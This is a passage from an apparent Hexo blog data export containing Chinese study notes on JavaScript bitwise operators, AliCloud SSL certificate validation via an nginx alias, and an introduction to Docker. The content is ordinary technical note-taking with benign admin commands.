AND(&)\n位运算 `AND` 由和号（`&`）表示，直接对数字的二进制形式进行运算。它把每个`数字中的数位对齐`，然后用下面的规则对同一位置上的两个数位进行 AND 运算：\n\n### 位运算 OR(|)\n位运算 OR 由符号（|）表示，也是直接对数字的二进制形式进行运算。在计算每位时，OR 运算符采用下列规则：\n\n### 位运算 XOR(^)\n\n### 左移运算(<<)\n\n### 有符号右移运算(>>)\n\n### 无符号右移运算(>>>)\n正数 与 有符号右移运算 相同;\n负数 不同\n\n","slug":"programmingLanguage/位运算符","published":1,"updated":"2018-11-28T07:07:09.876Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxwo0050zodvt0vyq3s1","content":"<h2 id=\"ECMAScript-位运算符\"><a href=\"#ECMAScript-位运算符\" class=\"headerlink\" title=\"ECMAScript 位运算符\"></a><a href=\"http://www.w3school.com.cn/js/pro_js_operators_bitwise.asp\" target=\"_blank\" rel=\"noopener\">ECMAScript 位运算符</a></h2><h3 id=\"位运算符是在数字底层（即表示数字的-32-个数位）进行操作的。\"><a href=\"#位运算符是在数字底层（即表示数字的-32-个数位）进行操作的。\" class=\"headerlink\" title=\"位运算符是在数字底层（即表示数字的 32 个数位）进行操作的。\"></a>位运算符是在数字底层（即表示数字的 32 个数位）进行操作的。</h3><hr>\n<h3 id=\"重温整数\"><a href=\"#重温整数\" class=\"headerlink\" title=\"重温整数\"></a>重温整数</h3><p><code>ECMAScript</code> 整数有<code>两种类型</code>，即<code>有符号整数</code>（允许用正数和负数）和<code>无符号整数</code>（只允许用正数）。<br>在 <code>ECMAScript</code> 中，所有<code>整数字面量</code>默认都是<code>有符号整数</code>，这意味着什么呢？</p>\n<p><code>有符号整数</code>使用 <code>31</code> 位表示整数的<code>数值</code>，用第 <code>32</code> 位表示整数的<code>符号</code>，<code>0 表示正数</code>，<code>1 表示负数</code>。数值范围从 <code>-2147483648</code> 到 <code>2147483647</code>。</p>\n<p>可以以<code>两种不同的方式</code>存储 <code>二进制形式的有符号整数</code>，一种用于存储<code>正数</code>，一种用于存储<code>负数</code>。</p>\n<p>正数是以真二进制形式存储的，前 31 位中的每一位都表示 2 的幂，从第 1 位（位 0）开始，表示 20，第 2 位（位 1）表示 21。没用到的位用 0 填充，即忽略不计。例如，下图展示的是数 18 的表示法。</p>\n<p>18 的二进制版本只用了前 5 位，它们是这个数字的有效位。把数字转换成二进制字符串，就能看到有效位：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var iNum = 18;</span><br><span class=\"line\">alert(iNum.toString(2));  //输出 &quot;10010&quot;</span><br></pre></td></tr></table></figure></p>\n<p>这段代码只输出 <code>&quot;10010&quot;</code>，而不是 18 的 32 位表示。其他的数位并不重要，因为仅使用前 5 位即可确定这个十进制数值。如下图所示：</p>\n<blockquote>\n<p>(2^4 <em> 1) + (2^3 </em> 0) + (2^2 <em> 0) + (2^1 </em> 1) + (2^0 * 0)</p>\n</blockquote>\n<p>负数也存储为二进制代码，不过采用的形式<code>是二进制补码</code>。计算数字二进制补码的步骤有三步：</p>\n<ol>\n<li>确定该数字的非负版本的二进制表示（例如，要计算 -18的二进制补码，首先要确定 18 的二进制表示）</li>\n</ol>\n<p>要确定 -18 的二进制表示，首先必须得到 18 的二进制表示，如下所示：</p>\n<blockquote>\n<p>0000 0000 0000 0000 0000 0000 0001 0010</p>\n</blockquote>\n<ol>\n<li>求得二进制反码，即要把 0 替换为 1，把 1 替换为 0</li>\n</ol>\n<p>接下来，计算二进制反码，如下所示：</p>\n<blockquote>\n<p>1111 1111 1111 1111 1111 1111 1110 1101</p>\n</blockquote>\n<ol>\n<li>在二进制反码上加 1</li>\n</ol>\n<p>最后，在二进制反码上加 1，如下所示：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1111 1111 1111 1111 1111 1111 1110 1101</span><br><span class=\"line\">                                      1</span><br><span class=\"line\">---------------------------------------</span><br><span class=\"line\">1111 1111 1111 1111 1111 1111 1110 1110</span><br></pre></td></tr></table></figure></p>\n<p>因此，-18 的二进制表示即 <code>1111 1111 1111 1111 1111 1111 1110 1110</code>。记住，在处理<code>有符号整数</code>时，开发者不能访问 <code>31</code> 位。</p>\n<p>有趣的是，把<code>负整数</code>转换成<code>二进制字符串</code>后，<code>ECMAScript</code> 并不以<code>二进制补码</code>的形式显示，而是用<code>数字绝对值</code>的<code>标准二进制代码</code>前面加<code>负号</code>的形式输出。例如：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var iNum = -18;</span><br><span class=\"line\">alert(iNum.toString(2));\t//输出 &quot;-10010&quot;</span><br></pre></td></tr></table></figure></p>\n<p>这段代码输出的是 <code>&quot;-10010&quot;</code>，而<code>非二进制补码</code>，这是为<code>避免访问位 31</code>。为了简便，ECMAScript 用一种简单的方式处理整数，使得开发者不必关心它们的用法。</p>\n<p>另一方面，<code>无符号整数</code>把 最后一位 作为 另一个 数位 处理。</p>\n<p>在这种模式中，第 <code>32</code> 位不表示<code>数字的符号</code>，而是<code>值 2^31</code>。由于这个<code>额外的位</code>，无符号整数的数值范围为 0 到 4294967295。对于小于 2147483647 的整数来说，无符号整数看来与有符号整数一样，而大于 2147483647 的整数则要使用位 31（在有符号整数中，这一位总是 0）。</p>\n<p>把无符号整数转换成字符串后，只返回它们的有效位。</p>\n<p>注意：所有整数字面量都默认存储为有符号整数。只有 ECMAScript 的位运算符才能创建无符号整数。</p>\n<hr>\n<h3 id=\"位运算-NOT\"><a href=\"#位运算-NOT\" class=\"headerlink\" title=\"位运算 NOT(~)\"></a>位运算 NOT(~)</h3><p>位运算 <code>NOT</code> 由否定号（<code>~</code>）表示，它是 <code>ECMAScript</code> 中为数不多的与<code>二进制算术</code>有关的运算符之一。</p>\n<p>位运算 NOT 是三步的处理过程：</p>\n<ol>\n<li>把运算数转换成 32 位数字</li>\n<li>把二进制数转换成它的二进制反码</li>\n<li>把二进制数转换成浮点数</li>\n</ol>\n<p>例如：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var iNum1 = 25;\t\t//25 等于 00000000000000000000000000011001</span><br><span class=\"line\">var iNum2 = ~iNum1;\t//转换为 11111111111111111111111111100110</span><br><span class=\"line\">alert(iNum2);\t\t//输出 &quot;-26&quot;</span><br></pre></td></tr></table></figure></p>\n<p>位运算 NOT 实质上是对数字求负，然后减 1，因此 25 变 -26。用下面的方法也可以得到同样的方法：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var iNum1 = 25;</span><br><span class=\"line\">var iNum2 = -iNum1 -1;</span><br><span class=\"line\">alert(iNum2);\t//输出 -26</span><br></pre></td></tr></table></figure>\n<h3 id=\"位运算-AND-amp\"><a href=\"#位运算-AND-amp\" class=\"headerlink\" title=\"位运算 AND(&amp;)\"></a>位运算 AND(&amp;)</h3><p>位运算 <code>AND</code> 由和号（<code>&amp;</code>）表示，直接对数字的二进制形式进行运算。它把每个<code>数字中的数位对齐</code>，然后用下面的规则对同一位置上的两个数位进行 AND 运算：</p>\n<h3 id=\"位运算-OR\"><a href=\"#位运算-OR\" class=\"headerlink\" title=\"位运算 OR(|)\"></a>位运算 OR(|)</h3><p>位运算 OR 由符号（|）表示，也是直接对数字的二进制形式进行运算。在计算每位时，OR 运算符采用下列规则：</p>\n<h3 id=\"位运算-XOR\"><a href=\"#位运算-XOR\" class=\"headerlink\" title=\"位运算 XOR(^)\"></a>位运算 XOR(^)</h3><h3 id=\"左移运算-lt-lt\"><a href=\"#左移运算-lt-lt\" class=\"headerlink\" title=\"左移运算(&lt;&lt;)\"></a>左移运算(&lt;&lt;)</h3><h3 id=\"有符号右移运算-gt-gt\"><a href=\"#有符号右移运算-gt-gt\" class=\"headerlink\" title=\"有符号右移运算(&gt;&gt;)\"></a>有符号右移运算(&gt;&gt;)</h3><h3 id=\"无符号右移运算-gt-gt-gt\"><a href=\"#无符号右移运算-gt-gt-gt\" class=\"headerlink\" title=\"无符号右移运算(&gt;&gt;&gt;)\"></a>无符号右移运算(&gt;&gt;&gt;)</h3><p>正数 与 有符号右移运算 相同;<br>负数 不同</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"ECMAScript-位运算符\"><a href=\"#ECMAScript-位运算符\" class=\"headerlink\" title=\"ECMAScript 位运算符\"></a><a href=\"http://www.w3school.com.cn/js/pro_js_operators_bitwise.asp\" target=\"_blank\" rel=\"noopener\">ECMAScript 位运算符</a></h2><h3 id=\"位运算符是在数字底层（即表示数字的-32-个数位）进行操作的。\"><a href=\"#位运算符是在数字底层（即表示数字的-32-个数位）进行操作的。\" class=\"headerlink\" title=\"位运算符是在数字底层（即表示数字的 32 个数位）进行操作的。\"></a>位运算符是在数字底层（即表示数字的 32 个数位）进行操作的。</h3><hr>\n<h3 id=\"重温整数\"><a href=\"#重温整数\" class=\"headerlink\" title=\"重温整数\"></a>重温整数</h3><p><code>ECMAScript</code> 整数有<code>两种类型</code>，即<code>有符号整数</code>（允许用正数和负数）和<code>无符号整数</code>（只允许用正数）。<br>在 <code>ECMAScript</code> 中，所有<code>整数字面量</code>默认都是<code>有符号整数</code>，这意味着什么呢？</p>\n<p><code>有符号整数</code>使用 <code>31</code> 位表示整数的<code>数值</code>，用第 <code>32</code> 位表示整数的<code>符号</code>，<code>0 表示正数</code>，<code>1 表示负数</code>。数值范围从 <code>-2147483648</code> 到 <code>2147483647</code>。</p>\n<p>可以以<code>两种不同的方式</code>存储 <code>二进制形式的有符号整数</code>，一种用于存储<code>正数</code>，一种用于存储<code>负数</code>。</p>\n<p>正数是以真二进制形式存储的，前 31 位中的每一位都表示 2 的幂，从第 1 位（位 0）开始，表示 20，第 2 位（位 1）表示 21。没用到的位用 0 填充，即忽略不计。例如，下图展示的是数 18 的表示法。</p>\n<p>18 的二进制版本只用了前 5 位，它们是这个数字的有效位。把数字转换成二进制字符串，就能看到有效位：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var iNum = 18;</span><br><span class=\"line\">alert(iNum.toString(2));  //输出 &quot;10010&quot;</span><br></pre></td></tr></table></figure></p>\n<p>这段代码只输出 <code>&quot;10010&quot;</code>，而不是 18 的 32 位表示。其他的数位并不重要，因为仅使用前 5 位即可确定这个十进制数值。如下图所示：</p>\n<blockquote>\n<p>(2^4 <em> 1) + (2^3 </em> 0) + (2^2 <em> 0) + (2^1 </em> 1) + (2^0 * 0)</p>\n</blockquote>\n<p>负数也存储为二进制代码，不过采用的形式<code>是二进制补码</code>。计算数字二进制补码的步骤有三步：</p>\n<ol>\n<li>确定该数字的非负版本的二进制表示（例如，要计算 -18的二进制补码，首先要确定 18 的二进制表示）</li>\n</ol>\n<p>要确定 -18 的二进制表示，首先必须得到 18 的二进制表示，如下所示：</p>\n<blockquote>\n<p>0000 0000 0000 0000 0000 0000 0001 0010</p>\n</blockquote>\n<ol>\n<li>求得二进制反码，即要把 0 替换为 1，把 1 替换为 0</li>\n</ol>\n<p>接下来，计算二进制反码，如下所示：</p>\n<blockquote>\n<p>1111 1111 1111 1111 1111 1111 1110 1101</p>\n</blockquote>\n<ol>\n<li>在二进制反码上加 1</li>\n</ol>\n<p>最后，在二进制反码上加 1，如下所示：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1111 1111 1111 1111 1111 1111 1110 1101</span><br><span class=\"line\">                                      1</span><br><span class=\"line\">---------------------------------------</span><br><span class=\"line\">1111 1111 1111 1111 1111 1111 1110 1110</span><br></pre></td></tr></table></figure></p>\n<p>因此，-18 的二进制表示即 <code>1111 1111 1111 1111 1111 1111 1110 1110</code>。记住，在处理<code>有符号整数</code>时，开发者不能访问 <code>31</code> 位。</p>\n<p>有趣的是，把<code>负整数</code>转换成<code>二进制字符串</code>后，<code>ECMAScript</code> 并不以<code>二进制补码</code>的形式显示，而是用<code>数字绝对值</code>的<code>标准二进制代码</code>前面加<code>负号</code>的形式输出。例如：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var iNum = -18;</span><br><span class=\"line\">alert(iNum.toString(2));\t//输出 &quot;-10010&quot;</span><br></pre></td></tr></table></figure></p>\n<p>这段代码输出的是 <code>&quot;-10010&quot;</code>，而<code>非二进制补码</code>，这是为<code>避免访问位 31</code>。为了简便，ECMAScript 用一种简单的方式处理整数，使得开发者不必关心它们的用法。</p>\n<p>另一方面，<code>无符号整数</code>把 最后一位 作为 另一个 数位 处理。</p>\n<p>在这种模式中，第 <code>32</code> 位不表示<code>数字的符号</code>，而是<code>值 2^31</code>。由于这个<code>额外的位</code>，无符号整数的数值范围为 0 到 4294967295。对于小于 2147483647 的整数来说，无符号整数看来与有符号整数一样，而大于 2147483647 的整数则要使用位 31（在有符号整数中，这一位总是 0）。</p>\n<p>把无符号整数转换成字符串后，只返回它们的有效位。</p>\n<p>注意：所有整数字面量都默认存储为有符号整数。只有 ECMAScript 的位运算符才能创建无符号整数。</p>\n<hr>\n<h3 id=\"位运算-NOT\"><a href=\"#位运算-NOT\" class=\"headerlink\" title=\"位运算 NOT(~)\"></a>位运算 NOT(~)</h3><p>位运算 <code>NOT</code> 由否定号（<code>~</code>）表示，它是 <code>ECMAScript</code> 中为数不多的与<code>二进制算术</code>有关的运算符之一。</p>\n<p>位运算 NOT 是三步的处理过程：</p>\n<ol>\n<li>把运算数转换成 32 位数字</li>\n<li>把二进制数转换成它的二进制反码</li>\n<li>把二进制数转换成浮点数</li>\n</ol>\n<p>例如：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var iNum1 = 25;\t\t//25 等于 00000000000000000000000000011001</span><br><span class=\"line\">var iNum2 = ~iNum1;\t//转换为 11111111111111111111111111100110</span><br><span class=\"line\">alert(iNum2);\t\t//输出 &quot;-26&quot;</span><br></pre></td></tr></table></figure></p>\n<p>位运算 NOT 实质上是对数字求负，然后减 1，因此 25 变 -26。用下面的方法也可以得到同样的方法：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var iNum1 = 25;</span><br><span class=\"line\">var iNum2 = -iNum1 -1;</span><br><span class=\"line\">alert(iNum2);\t//输出 -26</span><br></pre></td></tr></table></figure>\n<h3 id=\"位运算-AND-amp\"><a href=\"#位运算-AND-amp\" class=\"headerlink\" title=\"位运算 AND(&amp;)\"></a>位运算 AND(&amp;)</h3><p>位运算 <code>AND</code> 由和号（<code>&amp;</code>）表示，直接对数字的二进制形式进行运算。它把每个<code>数字中的数位对齐</code>，然后用下面的规则对同一位置上的两个数位进行 AND 运算：</p>\n<h3 id=\"位运算-OR\"><a href=\"#位运算-OR\" class=\"headerlink\" title=\"位运算 OR(|)\"></a>位运算 OR(|)</h3><p>位运算 OR 由符号（|）表示，也是直接对数字的二进制形式进行运算。在计算每位时，OR 运算符采用下列规则：</p>\n<h3 id=\"位运算-XOR\"><a href=\"#位运算-XOR\" class=\"headerlink\" title=\"位运算 XOR(^)\"></a>位运算 XOR(^)</h3><h3 id=\"左移运算-lt-lt\"><a href=\"#左移运算-lt-lt\" class=\"headerlink\" title=\"左移运算(&lt;&lt;)\"></a>左移运算(&lt;&lt;)</h3><h3 id=\"有符号右移运算-gt-gt\"><a href=\"#有符号右移运算-gt-gt\" class=\"headerlink\" title=\"有符号右移运算(&gt;&gt;)\"></a>有符号右移运算(&gt;&gt;)</h3><h3 id=\"无符号右移运算-gt-gt-gt\"><a href=\"#无符号右移运算-gt-gt-gt\" class=\"headerlink\" title=\"无符号右移运算(&gt;&gt;&gt;)\"></a>无符号右移运算(&gt;&gt;&gt;)</h3><p>正数 与 有符号右移运算 相同;<br>负数 不同</p>\n"},{"title":"AliCloud-SSL证书认证","date":"2018-08-08T03:18:53.000Z","_content":"## 阿里云-SSL证书认证\n保证在规定域名下可以访问到`证书编号`\n![](../../assets/img/AliCloud-SSL证书认证.jpg)\n\n### 配置Nginx\n首先因为 `Nginx反向代理` 问题，需要配置目录文件\n+ SSH登录 生产服务器 `jdyxqq.com root` psd:**** 5*\n+ 找到Nginx服务配置\n  > find / -name nginx\n  ````\n  /usr/local/sbin/nginx  # 程序文件\n  /usr/local/etc/rc.d/nginx  # 后台程序 管理重启、开机启动\n  /usr/local/etc/nginx  # 系统配置项\n  /usr/ports/www/nginx  # Nginx文档\n  /mnt/www/etc/nginx  # 分配置文件(要修改的路径)\n  /var/tmp/nginx  # 临时、缓存文件\n  /var/log/nginx  # 临时、缓存文件\n  ````\n+ 进入`/mnt/www/etc/nginx`修改添加\n  ````\n  vim jing*.conf\n\n  # 添加代理\n  location /.well-known {\n    alias /mnt/www/jing*/html/.well-know; # 分号很重要\n  }\n  ````\n\n### 进入配置路径并添加文件\n+ mkdir -p /mnt/www/jing*/html/.well-know/pki-validation  # 创建目录路径\n+ vim fileauth.txt  # 创建目标文件 并把 认证码 键入\n\n### 保证访问路径可以访问认证码\nhttp://jdyxqq.com/.well-known/pki-validation/fileauth.txt\n\n## p.s 一般代理路径下都有 空的 index.html 防止获取 路径下文件 [内容保护]\n","source":"_posts/server/AliCloud-SSL证书认证.md","raw":"---\ntitle: AliCloud-SSL证书认证\ndate: 2018-08-08 11:18:53\ntags: SSL认证\ncategories: SSL\n---\n## 阿里云-SSL证书认证\n保证在规定域名下可以访问到`证书编号`\n![](../../assets/img/AliCloud-SSL证书认证.jpg)\n\n### 配置Nginx\n首先因为 `Nginx反向代理` 问题，需要配置目录文件\n+ SSH登录 生产服务器 `jdyxqq.com root` psd:**** 5*\n+ 找到Nginx服务配置\n  > find / -name nginx\n  ````\n  /usr/local/sbin/nginx  # 程序文件\n  /usr/local/etc/rc.d/nginx  # 后台程序 管理重启、开机启动\n  /usr/local/etc/nginx  # 系统配置项\n  /usr/ports/www/nginx  # Nginx文档\n  /mnt/www/etc/nginx  # 分配置文件(要修改的路径)\n  /var/tmp/nginx  # 临时、缓存文件\n  /var/log/nginx  # 临时、缓存文件\n  ````\n+ 进入`/mnt/www/etc/nginx`修改添加\n  ````\n  vim jing*.conf\n\n  # 添加代理\n  location /.well-known {\n    alias /mnt/www/jing*/html/.well-know; # 分号很重要\n  }\n  ````\n\n### 进入配置路径并添加文件\n+ mkdir -p /mnt/www/jing*/html/.well-know/pki-validation  # 创建目录路径\n+ vim fileauth.txt  # 创建目标文件 并把 认证码 键入\n\n### 保证访问路径可以访问认证码\nhttp://jdyxqq.com/.well-known/pki-validation/fileauth.txt\n\n## p.s 一般代理路径下都有 空的 index.html 防止获取 路径下文件 [内容保护]\n","slug":"server/AliCloud-SSL证书认证","published":1,"updated":"2018-09-05T06:33:18.509Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxwq0054zodvavro59mk","content":"<h2 id=\"阿里云-SSL证书认证\"><a href=\"#阿里云-SSL证书认证\" class=\"headerlink\" title=\"阿里云-SSL证书认证\"></a>阿里云-SSL证书认证</h2><p>保证在规定域名下可以访问到<code>证书编号</code><br><img src=\"../../assets/img/AliCloud-SSL证书认证.jpg\" alt=\"\"></p>\n<h3 id=\"配置Nginx\"><a href=\"#配置Nginx\" class=\"headerlink\" title=\"配置Nginx\"></a>配置Nginx</h3><p>首先因为 <code>Nginx反向代理</code> 问题，需要配置目录文件</p>\n<ul>\n<li>SSH登录 生产服务器 <code>jdyxqq.com root</code> psd:<em>**</em> 5*</li>\n<li><p>找到Nginx服务配置</p>\n<blockquote>\n<p>find / -name nginx</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/usr/local/sbin/nginx  # 程序文件</span><br><span class=\"line\">/usr/local/etc/rc.d/nginx  # 后台程序 管理重启、开机启动</span><br><span class=\"line\">/usr/local/etc/nginx  # 系统配置项</span><br><span class=\"line\">/usr/ports/www/nginx  # Nginx文档</span><br><span class=\"line\">/mnt/www/etc/nginx  # 分配置文件(要修改的路径)</span><br><span class=\"line\">/var/tmp/nginx  # 临时、缓存文件</span><br><span class=\"line\">/var/log/nginx  # 临时、缓存文件</span><br></pre></td></tr></table></figure>\n</blockquote>\n</li>\n<li><p>进入<code>/mnt/www/etc/nginx</code>修改添加</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim jing*.conf</span><br><span class=\"line\"></span><br><span class=\"line\"># 添加代理</span><br><span class=\"line\">location /.well-known &#123;</span><br><span class=\"line\">  alias /mnt/www/jing*/html/.well-know; # 分号很重要</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h3 id=\"进入配置路径并添加文件\"><a href=\"#进入配置路径并添加文件\" class=\"headerlink\" title=\"进入配置路径并添加文件\"></a>进入配置路径并添加文件</h3><ul>\n<li>mkdir -p /mnt/www/jing*/html/.well-know/pki-validation  # 创建目录路径</li>\n<li>vim fileauth.txt  # 创建目标文件 并把 认证码 键入</li>\n</ul>\n<h3 id=\"保证访问路径可以访问认证码\"><a href=\"#保证访问路径可以访问认证码\" class=\"headerlink\" title=\"保证访问路径可以访问认证码\"></a>保证访问路径可以访问认证码</h3><p><a href=\"http://jdyxqq.com/.well-known/pki-validation/fileauth.txt\" target=\"_blank\" rel=\"noopener\">http://jdyxqq.com/.well-known/pki-validation/fileauth.txt</a></p>\n<h2 id=\"p-s-一般代理路径下都有-空的-index-html-防止获取-路径下文件-内容保护\"><a href=\"#p-s-一般代理路径下都有-空的-index-html-防止获取-路径下文件-内容保护\" class=\"headerlink\" title=\"p.s 一般代理路径下都有 空的 index.html 防止获取 路径下文件 [内容保护]\"></a>p.s 一般代理路径下都有 空的 index.html 防止获取 路径下文件 [内容保护]</h2>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"阿里云-SSL证书认证\"><a href=\"#阿里云-SSL证书认证\" class=\"headerlink\" title=\"阿里云-SSL证书认证\"></a>阿里云-SSL证书认证</h2><p>保证在规定域名下可以访问到<code>证书编号</code><br><img src=\"../../assets/img/AliCloud-SSL证书认证.jpg\" alt=\"\"></p>\n<h3 id=\"配置Nginx\"><a href=\"#配置Nginx\" class=\"headerlink\" title=\"配置Nginx\"></a>配置Nginx</h3><p>首先因为 <code>Nginx反向代理</code> 问题，需要配置目录文件</p>\n<ul>\n<li>SSH登录 生产服务器 <code>jdyxqq.com root</code> psd:<em>**</em> 5*</li>\n<li><p>找到Nginx服务配置</p>\n<blockquote>\n<p>find / -name nginx</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/usr/local/sbin/nginx  # 程序文件</span><br><span class=\"line\">/usr/local/etc/rc.d/nginx  # 后台程序 管理重启、开机启动</span><br><span class=\"line\">/usr/local/etc/nginx  # 系统配置项</span><br><span class=\"line\">/usr/ports/www/nginx  # Nginx文档</span><br><span class=\"line\">/mnt/www/etc/nginx  # 分配置文件(要修改的路径)</span><br><span class=\"line\">/var/tmp/nginx  # 临时、缓存文件</span><br><span class=\"line\">/var/log/nginx  # 临时、缓存文件</span><br></pre></td></tr></table></figure>\n</blockquote>\n</li>\n<li><p>进入<code>/mnt/www/etc/nginx</code>修改添加</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim jing*.conf</span><br><span class=\"line\"></span><br><span class=\"line\"># 添加代理</span><br><span class=\"line\">location /.well-known &#123;</span><br><span class=\"line\">  alias /mnt/www/jing*/html/.well-know; # 分号很重要</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h3 id=\"进入配置路径并添加文件\"><a href=\"#进入配置路径并添加文件\" class=\"headerlink\" title=\"进入配置路径并添加文件\"></a>进入配置路径并添加文件</h3><ul>\n<li>mkdir -p /mnt/www/jing*/html/.well-know/pki-validation  # 创建目录路径</li>\n<li>vim fileauth.txt  # 创建目标文件 并把 认证码 键入</li>\n</ul>\n<h3 id=\"保证访问路径可以访问认证码\"><a href=\"#保证访问路径可以访问认证码\" class=\"headerlink\" title=\"保证访问路径可以访问认证码\"></a>保证访问路径可以访问认证码</h3><p><a href=\"http://jdyxqq.com/.well-known/pki-validation/fileauth.txt\" target=\"_blank\" rel=\"noopener\">http://jdyxqq.com/.well-known/pki-validation/fileauth.txt</a></p>\n<h2 id=\"p-s-一般代理路径下都有-空的-index-html-防止获取-路径下文件-内容保护\"><a href=\"#p-s-一般代理路径下都有-空的-index-html-防止获取-路径下文件-内容保护\" class=\"headerlink\" title=\"p.s 一般代理路径下都有 空的 index.html 防止获取 路径下文件 [内容保护]\"></a>p.s 一般代理路径下都有 空的 index.html 防止获取 路径下文件 [内容保护]</h2>"},{"title":"Docker之旅","date":"2018-07-18T05:12:24.000Z","_content":"## 黑马Docker之旅\n\n### 第一节 简介\n#### 概述\n\nDocker是一个`容器化`技术, 是虚拟化的一种实现方案\n\n1. 什么是虚拟化技术：\n  所谓虚拟化技术，其实是一种资源管理技术。可将计算机中实体资源进行虚拟化.\n  虚拟化技术种类：软件虚拟化、硬件虚拟化、内存虚拟化、网络虚拟化、桌面虚拟化、服务虚拟化、虚拟机等等\n\n2. 什么是Docker\n3. DockerComponent(`镜像`, `注册中心`, `容器`, `客户端`, `服务器`)\n4. Docker镜像操作\n5. Docker容器操作\n6. Docker容器备份/迁移\n","source":"_posts/server/Docker之旅.md","raw":"---\ntitle: Docker之旅\ndate: 2018-07-18 13:12:24\ntags: Docker学习笔记\ncategories: Docker\n---\n## 黑马Docker之旅\n\n### 第一节 简介\n#### 概述\n\nDocker是一个`容器化`技术, 是虚拟化的一种实现方案\n\n1. 什么是虚拟化技术：\n  所谓虚拟化技术，其实是一种资源管理技术。可将计算机中实体资源进行虚拟化.\n  虚拟化技术种类：软件虚拟化、硬件虚拟化、内存虚拟化、网络虚拟化、桌面虚拟化、服务虚拟化、虚拟机等等\n\n2. 什么是Docker\n3. DockerComponent(`镜像`, `注册中心`, `容器`, `客户端`, `服务器`)\n4. Docker镜像操作\n5. Docker容器操作\n6. Docker容器备份/迁移\n","slug":"server/Docker之旅","published":1,"updated":"2018-09-05T06:33:18.510Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxws0056zodv57hcru6s","content":"<h2 id=\"黑马Docker之旅\"><a href=\"#黑马Docker之旅\" class=\"headerlink\" title=\"黑马Docker之旅\"></a>黑马Docker之旅</h2><h3 id=\"第一节-简介\"><a href=\"#第一节-简介\" class=\"headerlink\" title=\"第一节 简介\"></a>第一节 简介</h3><h4 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h4><p>Docker是一个<code>容器化</code>技术, 是虚拟化的一种实现方案</p>\n<ol>\n<li><p>什么是虚拟化技术：<br>所谓虚拟化技术，其实是一种资源管理技术。可将计算机中实体资源进行虚拟化.<br>虚拟化技术种类：软件虚拟化、硬件虚拟化、内存虚拟化、网络虚拟化、桌面虚拟化、服务虚拟化、虚拟机等等</p>\n</li>\n<li><p>什么是Docker</p>\n</li>\n<li>DockerComponent(<code>镜像</code>, <code>注册中心</code>, <code>容器</code>, <code>客户端</code>, <code>服务器</code>)</li>\n<li>Docker镜像操作</li>\n<li>Docker容器操作</li>\n<li>Docker容器备份/迁移</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"黑马Docker之旅\"><a href=\"#黑马Docker之旅\" class=\"headerlink\" title=\"黑马Docker之旅\"></a>黑马Docker之旅</h2><h3 id=\"第一节-简介\"><a href=\"#第一节-简介\" class=\"headerlink\" title=\"第一节 简介\"></a>第一节 简介</h3><h4 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h4><p>Docker是一个<code>容器化</code>技术, 